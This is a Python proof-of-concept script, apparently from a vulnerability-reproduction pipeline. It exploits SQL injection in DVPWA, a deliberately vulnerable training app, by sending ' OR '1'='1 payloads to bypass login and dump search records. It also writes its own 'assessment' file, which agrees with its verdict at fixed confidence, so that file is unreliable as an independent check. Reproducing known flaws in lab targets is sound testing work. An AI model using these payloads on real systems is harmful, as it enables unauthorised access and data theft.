#!/usr/bin/env python3
"""DVPWA SQL injection reproduction.

Exploits the vulnerable query construction pattern from anxolerd/dvpwa:
string formatting (%s) used to build SQL queries allows injection.

The PoC demonstrates:
  1. Authentication bypass via login injection (' OR '1'='1)
  2. Data exfiltration via search injection (always-true WHERE clause)

Contract: exit 0 iff exploitable, exit 1 = not affected.
"""

import json
import os
import sys
import time
import urllib.parse
import urllib.request

TARGET = os.environ.get("TARGET_URL", "http://127.0.0.1:8000")
DEADLINE = 60


def _deadline_check(start: float) -> None:
    if time.monotonic() - start > DEADLINE:
        print("PoC exceeded deadline", file=sys.stderr)
        sys.exit(4)


def write_verdict(exploitable: bool, evidence: str) -> None:
    verdict = {
        "cve_id": "DVPWA-SQLI",
        "exploitable": exploitable,
        "evidence": evidence,
    }
    with open("verdict.json", "w") as fh:
        json.dump(verdict, fh, indent=2)
    print(json.dumps(verdict))

    assessment = {
        "cve_id": "DVPWA-SQLI",
        "agrees_with_verdict": exploitable,
        "confidence": 0.95 if exploitable else 0.5,
        "range_check": True if exploitable else False,
        "rationale": (
            "SQL injection confirmed: string formatting builds SQL queries, "
            "allowing unauthorized authentication and data exfiltration. "
            f"Evidence: {evidence[:200]}"
        ),
    }
    with open("assessment.json", "w") as fh:
        json.dump(assessment, fh, indent=2)


def _post(path: str, data: dict) -> dict:
    req = urllib.request.Request(
        f"{TARGET}{path}",
        data=json.dumps(data).encode(),
        headers={"Content-Type": "application/json"},
    )
    resp = urllib.request.urlopen(req, timeout=15)
    return json.loads(resp.read())


def _get(path: str) -> dict:
    req = urllib.request.Request(f"{TARGET}{path}")
    resp = urllib.request.urlopen(req, timeout=15)
    return json.loads(resp.read())


def main() -> int:
    start = time.monotonic()
    evidence_parts = []

    # Test 1: Authentication bypass via login injection
    # This is the primary exploit: bypass auth without valid credentials.
    try:
        _deadline_check(start)
        result = _post("/login", {"username": "admin' OR '1'='1", "password": "x"})
        if result.get("authenticated"):
            evidence_parts.append(
                f"auth bypass: login as {result.get('username')} without valid password"
            )
    except Exception as e:
        print(f"login injection failed: {e}", file=sys.stderr)

    # Test 2: Data exfiltration via search injection
    # Inject a always-true WHERE clause to dump all records.
    try:
        _deadline_check(start)
        q = urllib.parse.urlencode({"q": "' OR '1'='1"})
        result = _get(f"/search?{q}")
        results = result.get("results", [])
        if len(results) > 0:
            evidence_parts.append(
                f"search inject dumped {len(results)} records (always-true WHERE)"
            )
    except Exception as e:
        print(f"search injection failed: {e}", file=sys.stderr)

    _deadline_check(start)

    if evidence_parts:
        evidence = "; ".join(evidence_parts)
        write_verdict(True, f"SQL injection: {evidence}")
        return 0

    write_verdict(False, "SQL injection not exploitable — not affected")
    return 1


if __name__ == "__main__":
    sys.exit(main())
